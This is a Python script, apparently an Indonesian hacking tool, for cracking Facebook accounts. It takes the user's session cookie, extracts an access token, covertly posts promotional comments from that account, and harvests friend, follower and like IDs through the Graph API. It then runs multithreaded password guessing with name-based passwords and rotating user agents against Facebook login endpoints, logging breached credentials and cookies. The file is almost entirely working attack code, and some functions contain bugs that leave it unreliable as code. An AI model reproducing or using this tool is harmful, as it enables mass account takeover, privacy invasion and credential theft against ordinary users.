#!/usr/bin/python3
# Wekwek mau ngapain ?, kan udah jadi suhu :v

import re, requests, json, time, random, os, sys

from concurrent.futures import ThreadPoolExecutor as khamdihiXD
from bs4 import BeautifulSoup as parse
from rich.panel import Panel
from rich import print
from time import sleep

# Nampung
ok, cp, id, tambah = [],[],[],0
ses = requests.Session()
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
host = "https://mbasic.facebook.com";url = "https://mbasic.facebook.com/100000202457333/posts/5973962589287097/?app=fbl"
try:
     x = requests.get("http://ip-api.com/json/").json()
     ip = x.get("query")
     ng = x.get("country")
except:
     ip = "-"
     ng = "-"

def span():
    return print(Panel(f"""[white] _______  ______ _______ _______ _     _ _______ ______ 
 |       |_____/ |_____| |       |____/  |______ |_____]
 |_____  |    \_ |     | |_____  |    \_ |       |_____]\n
 coded   : Bocil kebelet hacker
 Negara  : {ng}
 IP      : {ip}""",style="purple"))

def hasil(ok,cp):
    if len(ok)!=0 or len(cp)!=0:
       print(Panel(f"[white][•] Total akun OK : {len(ok)}\n[•] Total akun CP : {len(cp)}",style="purple"))
    else:
       print(Panel("[white][•] Kamu tidak mendapatkan hasil OK atau CP",style="yellow"))

def masuk():
    os.system("clear");span()
    coki = input("  [%s?%s] Masukan cokie : "%(O,N))
    try:
        head = {
           "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
           "referer": "https://www.facebook.com/",
           "host": "business.facebook.com",
           "origin": "https://business.facebook.com",
           "upgrade-insecure-requests" : "1",
           "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
           "cache-control": "max-age=0",
           "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8",
           "cookie":coki
        }
        _url_ = requests.get("https://business.facebook.com/business_locations", headers=head);_tok_ = re.search("(EAAG\w+)", _url_.text).group(1)
        if "EAAG" in _tok_:open("Login/token.txt","w").write(_tok_);open("Login/cokie.txt","w").write(coki);komen(host,url,coki);menu()
        else:print(Panel("[white][×] maaf cookie anda bermasalah, silakan ganti",style="red"))
    except AttributeError:
        print(Panel("[white][×] maaf cookie anda bermasalah, silakan ganti",style="red"));exit()

# Bot komen gw woy
def komen(host, url,coki):
    global tambah
    print(Panel("[white][•] Tunggu sebentar, sedang menuju menu",style="green"))
    try:
        cokie = {"cookie":coki}
        ses = requests.Session()
        com = random.choice(["Pengguna script carck facebook lu kham","sukses selalu buat suhu ku satu ini♥","real programmer bang♥","fans lu nih:v"])
        otw = parse(ses.get(url,cookies=cokie).content,"html.parser")
        for you in otw.find_all("a", href=True):
            if "/mbasic/comment/advanced/?" in you["href"]:
                find_url = parse(ses.get(f"{host}"+you["href"], cookies=cokie).content,"html.parser")
                get_data = ses.get("https://m.facebook.com"+you["href"], cookies=cokie)
                for kopi in find_url.find_all("a", href=True):
                    if "/story.php?" in kopi["href"]:
                          data = {"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get_data.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(get_data.text)).group(1),"comment_text":"#khamdihi\n#khamdihiXD\n%s"%(com)}
                          posh = parse(ses.post(f"{host}"+kopi["href"], data=data, cookies=cokie).content,"html.parser")
                          find = posh.find("form",method="post")["action"]
                          kome = ses.post(f"{host}"+find, data=data, cookies=cokie)
                          tambah.append("✓")
                    else:
                          continue
        if len(tambah) > 2:menu()
        else:pass
    except:menu()
def menu():
    os.system("clear")
    try:
         cok = open("Login/cokie.txt","r").read();tok = open("Login/token.txt","r").read()
    except FileNotFoundError:
         print(Panel("[white][•] menuju menu login...",style="red"));sleep(2);masuk()
    try:
         kamu = requests.get("https://graph.facebook.com/me?metadata=1&access_token=%s"%(tok),cookies={"cookie":cok}).json().get("name")
    except (AttributeError,KeyError):
         print(Panel("[white][×] cookie kamu kadarluarsa..",style="red"));sleep(2);masuk()
    span()
    print(Panel(f"[white][•] Welcome : {kamu} selamat menggunakan tools ini", style="purple"))
    print(Panel("""[white][1] Crack Dari Publik       [2] Crack Dari Likes
[3] Crack Dari Publik Masal [4] Crack Dari Followers
[5] Cek Hasil Crack         [6] Cek Option sesi
[7] Crack Dari File         [0] Keluar Hapus Data""",style="purple"))
    x = input("  [%s?%s] Pilih : "%(O,N))
    if x in ["1","01"]:
       print(Panel(f"[white][•] {kamu} Ketik 'me' jika ingin crack dari daftar teman",style="purple"))
       idz = input("  [%s?%s] Masukan id : "%(O,N))
       try:
             iya = requests.get("https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s"%(idz,tok), cookies={"cookie":cok}).json()
             for kamu in iya.get("friends").get("data"):
                 memec = kamu.get("id")+"*"+kamu.get("name")
                 if memec in id:pass
                 else:id.append(memec)
       except (AttributeError,KeyError):print(Panel("[white][×] Kemungkinan ID privat om",style="red"));sleep(2);menu()
       if len(id)!=0:print(Panel("[white][•] Tunggu sebentar sedang menuju ke menu selanjutnya",style="purple"));lanjut(id)
       elif len(id) ==0:print(Panel("[white][×] Total id : kosong!",style="red"));exit()
    elif x in ["2","02"]:
       print(Panel("[white][•] Harap pastikan id tersebut publik",style="purple"))
       idne = input("  [%s?%s] Masukan id : "%(O,N))
       try:
             col = requests.get("https://graph.facebook.com/%s?fields=likes.limit(10000)&access_token=%s"%(idne,open("Login/token.txt","r").read()),cookies={"cookie":open("Login/cokie.txt","r").read()}).json()
             for mek in col.get("likes").get("data"):
                 coli = mek.get("id")+"*"+mek.get("name")
                 if coli in id:pass
                 else:id.append(coli)
       except (AttributeError,KeyError):print(Panel("[white][×] Kemungkinan id privat om",style="red"));sleep(2);menu()
       if len(id)!=0:print(Panel("[white][•] Tunggu sebentar sedang menuju ke menu selanjutnya",style="purple"));lanjut(id)
    elif x in ["3","03"]:
       print(Panel("[white][•] Type 'me' jika ingin crack dari daftar teman",style="purple"))
       try:
            tot = int(input("  [%s?%s] Dump berapa id : "%(O,N)))
       except:tot=1
       for ex in range(tot):
           ex+=1
           idne = input("  [%s•%s] Masukan id yang ke %s : "%(O,N,ex))
           try:
                respon = requests.get("https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s"%(idne,open("Login/token.txt","r").read()),cookies={"cookie":open("Login/cokie.txt","r").read()}).json()
                for khamdihinih_ in respon.get("friends").get("data"):
                    kntl = khamdihinih_.get("id")+"*"+khamdihinih_.get("name")
                    if kntl in id:pass
                    else:id.append(kntl)
           except (AttributeError,KeyError):pass
           if len(id)!=0:print(Panel(f"[white][•] Tunggu sebentar, sedang melanjutkan",style="purple"));sleep(1)
       lanjut(id)
    elif x in ["4","04"]:
       print(Panel("[white][•] Type 'me' jika ingin crack dari daftar followers",style="purple"))
       idne = input("  [%s?%s] Masukan id : "%(O,N))
       try:
            req = requests.get("https://graph.facebook.com/%s?fields=name,subscribers.fields(id,name).limit(999999)&access_token=%s"%(idne,open("Login/token.txt","r").read()),cookies={"cookie":open("Login/cokie.txt","r").read()}).json()
            for requ in req.get("subscribers").get("data"):
                kueh = str(requ.get("id"))+"*"+str(requ.get("name"))
                if kueh in id:pass
                else:id.append(kueh)
       except (AttributeError,KeyError):print(Panel("[white][×] Kemungkinan id privat mas",style="red"));sleep(2);menu()
       if len(id)==0:print(Panel("[white][•] Maaf total id : 0",style="red"));exit()
       else:lanjut(id)
    elif x in ["5","05"]:
       try:
                oke = open("OK.txt","r").readlines()
       except FileNotFoundError:
                print(Panel("[white][×] Maaf anda tidak mendapatkan results ok :-",style="red"))
       try:
                cpe = open("CP.txt","r").readlines()
       except FileNotFoundError:
                print(Panel("[white][×] Maaf anda tidak mendapatkan results CP :+",style="red"));exit()
       print(Panel("[white][•] Semua results OK anda di bawah ini",style="green"));os.system("cat OK.txt")
       print(Panel("[white][•] Semua results CP anda di bawah ini",style="green"));os.system("cat CP.txt");print("\n\n")
    elif x in ["6","06"]:
       print(Panel("[white][•] Masukan file yang berisi akun cp, file ori : CP.txt",style="purple"))
       file = input("  [%s?%s] Nama file : "%(O,N))
       try:
             isi = open(file).readlines()
       except FileNotFoundError:
             print(Panel("[white][×] Maaf file anda tidak di temukan :(",style="red"));exit()
       for akun in isi:
           chekin = akun.replace("\n","")
           bapak_ = chekin.split("|")
           print(Panel(f"[white][•] chekin accout : {chekin.split('[CP] ')[1]}",style="green"))
           main(bapak_[0].split('[CP] ')[1],bapak_[1])
    elif x in ["7","07"]:
        print(Panel("[white][•] Masukan nama file anda",style="purple"))
        a = input("  [%s?%s] File : "%(O,N))
        for i in open(a).readlines():
            id.append(i)
        lanjut(id)
    elif x in ["0","00"]:os.system("rm -rf Login/token.txt && rm -rf Login/cokie.txt");exit()
    else:menu()
def lanjut(id):
    print(Panel(f'[white][•] Berhasil dump dengan total id di bawa ini\n[white][•] Total id : {len(id)}',style="purple"))
    print(Panel("[white][•] Gunakan paassword otomatis/manual o/m",style="purple"))
    x = input("  [%s?%s] Pilih : "%(O,N))
    if x in ["o","O","otomatis"]:otomatis()
    else:manual()

def manual():
    print(Panel("[white][1] Crack Dari method free.facebook.com\n[2] Crack Dari method mbasic.facebook.com\n[3] Crack Dari method m.facebook.com (terserah pilih mana)",style="purple"))
    uh = input("  [%s?%s] Pilih : "%(O,N))
    if uh in ["1","01"]:
       print(Panel("[white][•] Informasi, gunakan koma untuk pemisahan seluruh password, contoh : sandi,sandi",style="purple"))
       pwx = input("  [%s?%s] Masukan password : "%(O,N)).split(",")
       print(Panel("[white][•] akun (OK) akan di simpan ke file : OK.txt\n[•] akun (CP) akan di simpan ke file : CP.txt",style="purple"));print("")
       with khamdihiXD(max_workers=30) as khamdihi:
            for manualya in id:
                list = manualya.split("*")
                khamdihi.submit(free,list,pwx)
       hasil(ok,cp)
    elif uh in ["2","02"]:
       print(Panel("[white][•] Informasi, gunakan koma untuk pemisahan seluruh password, contoh : sandi,sandi",style="purple"))
       pwx = input("  [%s?%s] Masukan password : "%(O,N)).split(",")
       print(Panel("[white][•] akun (OK) akan di simpan ke file : OK.txt\n[•] akun (CP) akan di simpan ke file : CP.txt",style="purple"));print("")
       with khamdihiXD(max_workers=30) as khamdihi:
            for manualya in id:
                list = manualya.split("*")
                khamdihi.submit(mbasic,list,pwx)
       hasil(ok,cp)
    else:
       print(Panel("[white][•] Informasi, gunakan koma untuk pemisahan seluruh password, contoh : sandi,sandi",style="purple"))
       pwx = input("  [%s?%s] Masukan password : "%(O,N)).split(",")
       print(Panel("[white][•] akun (OK) akan di simpan ke file : OK.txt\n[•] akun (CP) akan di simpan ke file : CP.txt",style="purple"));print("")
       with khamdihiXD(max_workers=30) as khamdihi:
            for manualya in id:
                list = manualya.split("*")
                khamdihi.submit(mobile,list,pwx)
       hasil(ok,cp)
def otomatis():
    print(Panel("[white][1] Crack Dari method free.facebook.com\n[2] Crack Dari method mbasic.facebook.com\n[3] Crack Dari method m.facebook.com (terserah pilih mana)",style="purple"))
    fik = input("  [%s?%s] Pilih : "%(O,N))
    if fik in ["1","01"]:
            print(Panel("[white][•] akun (OK) akan di simpan ke file : OK.txt\n[•] akun (CP) akan di simpan ke file : CP.txt",style="purple"));print('')
            with khamdihiXD(max_workers=30) as khamdihi:
                 for _khamdihi_ in id:
                     uid,nama = _khamdihi_.split("*")
                     password = nama.split(" ")
                     if len(password) == 1:
                        pwx = [
                                nama,
                                password[0]+"123",password[0]+"1234",
                                password[0]+"12345",password[0]+"123456"
                              ]
                     elif len(password) == 2:
                        pwx = [
                                nama,
                                password[0]+"123",password[1]+"123",
                                password[0]+"1234",password[1]+"1234",
                                password[0]+"12345",password[1]+"12345"
                              ]
                     else:
                        pwx = [
                               nama,
                               password[0]+"123",password[0]+"1234",
                               password[0]+"12345",password[0]+"123456"
                        ]
                     khamdihi.submit(free, uid, pwx)
            hasil(ok,cp)
    elif fik in ["2","02"]:
           print(Panel("[white][•] akun (OK) akan di simpan ke file : OK.txt\n[•] akun (CP) akan di simpan ke file : CP.txt",style="purple"))
           with khamdihiXD(max_workers=30) as khamdihi:
                 for _khamdihi_ in id:
                     uid,nama = _khamdihi_.split("*")
                     password = nama.split(" ")
                     if len(password) == 1:
                        pwx = [
                                nama,
                                password[0]+"123",password[0]+"1234",
                                password[0]+"12345",password[0]+"123456"
                              ]
                     elif len(password) == 2:
                        pwx = [
                                nama,
                                password[0]+"123",password[1]+"123",
                                password[0]+"1234",password[1]+"1234",
                                password[0]+"12345",password[1]+"12345"
                              ]
                     else:
                        pwx = [
                               nama,
                               password[0]+"123",password[0]+"1234",
                               password[0]+"12345",password[0]+"123456"
                        ]
                     khamdihi.submit(mbasic,uid,pwx)
           hasil(ok,cp)
    else:
           print(Panel("[white][•] akun (OK) akan di simpan ke file : OK.txt\n[•] akun (CP) akan di simpan ke file : CP.txt",style="purple"))
           with khamdihiXD(max_workers=30) as khamdihi:
                 for _khamdihi_ in id:
                     uid,nama = _khamdihi_.split("*")
                     password = nama.split(" ")
                     if len(password) == 1:
                        pwx = [
                                nama,
                                password[0]+"123",password[0]+"1234",
                                password[0]+"12345",password[0]+"123456"
                              ]
                     elif len(password) == 2:
                        pwx = [
                                nama,
                                password[0]+"123",password[1]+"123",
                                password[0]+"1234",password[1]+"1234",
                                password[0]+"12345",password[1]+"12345"
                              ]
                     else:
                        pwx = [
                               nama,
                               password[0]+"123",password[0]+"1234",
                               password[0]+"12345",password[0]+"123456"
                        ]
                     khamdihi.submit(mobile,uid,pwx)

           hasil(ok,cp)

def free(_user_, pwx):
	global tambah, ok, cp
	try:
		for pw in pwx:
			ses = requests.Session()
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","user-agent": "Mozilla/5.0 (Linux; U; Android 7.1.2; en-us; Redmi 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.2.5","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","referer": "https://m.facebook.com/login.php?next=https://business.facebook.com/business_locations","accept-encoding": "gzip, deflate","accept-language": "en-US"})
			a = ses.get("https://m.facebook.com/login/device-based/password/?uid=%s&next=https://business.facebook.com/business_locations&flow=login_no_pin&refsrc=deprecated&_rdr"%(_user_))
			data_ = {
				"lsd":re.search('name="lsd" value="(.*?)"', a.text).group(1),
				"jazoest":re.search('name="jazoest" value="(.*?)"', a.text).group(1),
				"uid":_user_,
				"next":"https://business.facebook.com/business_locations",
				"flow":"login_no_pin",
				"pass":pw
			}
			ses.headers.update({"Host": "m.facebook.com","content-length": "152","cache-control": "max-age=0","origin": "https://m.facebook.com","upgrade-insecure-requests": "1","user-agent": "Mozilla/5.0 (Linux; U; Android 7.1.2; en-us; Redmi 5A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.2.5","content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","referer": f"https://m.facebook.com/login/device-based/password/?uid={_user_}&next=https%3A%2F%2Fbusiness.facebook.com%2Fbusiness_locations&flow=login_no_pin&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate","accept-language": "en-US"})
			posh = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data=data_,allow_redirects=False)
			if 'checkpoint' in ses.cookies.get_dict():
				cp.append(_user_)
				open("CP.txt","a").write(_user_+"|"+pw)
				print(" *   --> %s|%s           "%(_user_,pw))
				break
			elif 'c_user' in ses.cookies.get_dict():
				ok.append(_user_)
				open("OK.txt","a").write(_user_+"|"+pw)
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(" *   --> %s|%s|%s           "%(_user_,pw,kuki))
				break
			else:
				continue
		tambah +=1
		print("\r [Crack] %s/%s [OK:%s][CP:%s]"%(tambah,len(id),len(ok),len(cp)),end="\r")
	except requests.exceptions.ConnectionError:sleep(30);crack_free(user,pwx)
def mbasic(user,pwx):
	global tambah, ok, cp
	_value_ = {}
	try:
		for pw in pwx:
			ses = requests.Session()
			ua = random.choice(['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16'])
			get_log_ = parse(ses.get(f"https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr").text,"html.parser")
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","referer": "https://mbasic.facebook.com/","accept-encoding": "gzip, deflate","accept-language": "en-US"})
			data_log = ["lsd","jazoest","next","flow"]
			for ikeh_ikeh_kimoci in get_log_.find_all("input"):
				if ikeh_ikeh_kimoci.get("name") in data_log:
					_value_.update({ikeh_ikeh_kimoci.get("name"):ikeh_ikeh_kimoci.get("value")})
					_value_.update({"uid":user,"pass":pw})
				elif ikeh_ikeh_kimoci.get("value") == None or "None":
					_value_.update({ikeh_ikeh_kimoci.get("name"):" "})
					_value_.update({"uid":user,"pass":pw})
				else:
					_value_.update({ikeh_ikeh_kimoci.get("name"):""})
					_value_.update({"uid":user,"pass":pw})
				ses.headers.update({"Host": "mbasic.facebook.com","content-length": "96","cache-control": "max-age=0","origin": "https://mbasic.facebook.com","upgrade-insecure-requests": "1","user-agent": ua,"content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","referer": f"https://mbasic.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate","accept-language": "en-US"})
				posh = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data=_value_,allow_redirects=False)
				if "checkpoint" in ses.cookies.get_dict():
					cp_coo = ses.cookies.get_dict()
					cokie_ = (str(cp_coo.get("datr"))+";"+str(cp_coo.get("locale"))+";"+str(cp_coo.get("sb")))
					print(f" [CP] {user}|{pw}|{cokie_} \n")
					cp.append(user);open("CP.txt","a").write(f"[CP] {user}|{pw}")
					break
				elif "c_user" in ses.cookies.get_dict():
					ok.append(user)
					open("OK.txt","a").write(f"[OK] {user}|{pw}")
					_cokies_ = ses.cookies.get_dict();kuki = "datr=" + _cokies_.get("datr") +";"+ "sb=" + _cokies_.get("sb") +";"+ "c_user=" + _cokies_.get("c_user") +";"+ "fr=" + _cokies_.get("fr") +";"+ "xs=" +_cokies_.get("xs")
					print(f" [OK] {user}|{pw}|{kuki} \n")
					break
				else:
					continue
		tambah +=1
		print("\r [Crack] %s/%s [OK:%s][CP:%s]"%(tambah,len(id),len(ok),len(cp)),end="\r")
	except requests.exceptions.ConnectionError:sleep(30)
	except Exception as e:print(e)
def mobile(user,pwx):
	global tambah, ok,cp
	_value_={}
	try:
		for pw in pwx:
			ua = random.choice(['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16'])
			ses=requests.Session()
			_heade_ = {}
			aaaa = parse(ses.get(f"https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr").content, "html.parser")
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","referer": "https://m.facebook.com/","accept-encoding": "gzip, deflate","accept-language": "en-US"})
			_data = ["lsd","jazoest","next","flow"]
			for cari in aaaa.find_all("input"):
				if cari.get("name") in _data:
					_value_.update({cari.get("name"):cari.get("value")})
					_value_.update({"uid":user,"pass":pw})
				elif cari.get("value") == "None" or None:
					_value_.update({ikeh_ikeh_kimoci.get("name"):""})
					_value_.update({"uid":user,"pass":pw})
				else:
					_value_.update({ikeh_ikeh_kimoci.get("name"):""})
					_value_.update({"uid":user,"pass":pw})
			ses.headers.update({"Host": "m.facebook.com","content-length": "158","cache-control": "max-age=0","origin": "https://m.facebook.com","upgrade-insecure-requests": "1","user-agent":ua,"content-type": "application/x-www-form-urlencoded","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","referer": f"https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate","accept-language": "en-US"})
			posh = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data=_value_,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				print(f" [OK] {user}|{pw}|{ua} \n")
				ok.append(user)
				open("OK.txt","a").write("[OK] %s|%s"%(user,pw))
				break
			elif "checkpoint" in ses.cookies.get_dict():
				print(f" [CP] {user}|{pw}|{ua} \n")
				cp.append(user)
				open("CP.txt","a").write("[CP] %s|%s"%(user,pw))
				break
			else:
				continue
		tambah+=1
		print("\r [Crack] %s/%s [OK:%s][CP:%s]"%(tambah,len(id),len(ok),len(cp)),end="\r")
	except requests.exceptions.ConnectionError:sleep(30)
# Cek opsi
def main(email,userx):
	try:
		ses = requests.Session()
		head = {
			"Host": "free.facebook.com",
			"upgrade-insecure-requests": "1",
			"user-agent": "Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36",
			"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"sec-fetch-site": "none",
			"sec-fetch-mode": "navigate",
			"sec-fetch-user": "?1",
			"sec-fetch-dest": "document",
			"sec-ch-ua-mobile": "?1",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
		url = ses.get("https://free.facebook.com/login.php")
		_data_ = {"lsd":re.search('name="lsd" value="(.*?)"', str(url.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(url.text)).group(1),"li":re.search('name="li" value="(.*?)"', str(url.text)).group(1),"try_number": "0","unrecognized_tries": "0","email"   : email,"pass"    : userx,"login"   : "Masuk","bi_xrwh" : "0"}
		cari = ses.post("https://free.facebook.com/login.php", data = _data_)
		if "c_user" in ses.cookies.get_dict():
			print("\n [OK] %s|%s"%(email,userx))
			open("OK.txt","a").write("[OK] %s|%s"%(email,userx))
		elif "checkpoint" in ses.cookies.get_dict():
			_html_ = parse(cari.text,"html.parser");_date_ = _html_.find("form",{"method":"post"})["action"]
			_opsi_ = {"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(cari.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(cari.text)).group(1),"checkpoint_data": "","submit[Continue]": "Lanjutkan","nh":re.search('name="nh" value="(.*?)"', str(cari.text)).group(1)}
			_ke2_ = ses.post("https://free.facebook.com/%s"%(_date_), data = _opsi_)
			_cek_ = parse(_ke2_.text,"html.parser")
			_sih_ = _cek_.find_all("option")
			if len(_sih_) == 0:
				print("\n ✓ Tidak ada opsi ngab !")
			else:
				for pram in (_sih_):
					print(Panel(f"[white] akun : {email}|{userx}\n opsi : {pram.text}",style="yellow"))
		else:
			print("\n ×  Pewek salah !")
	except Exception as u:print(str(u))

def folder():
    try:os.mkdir("Login")
    except:pass

if __name__ == "__main__":
   folder();menu()

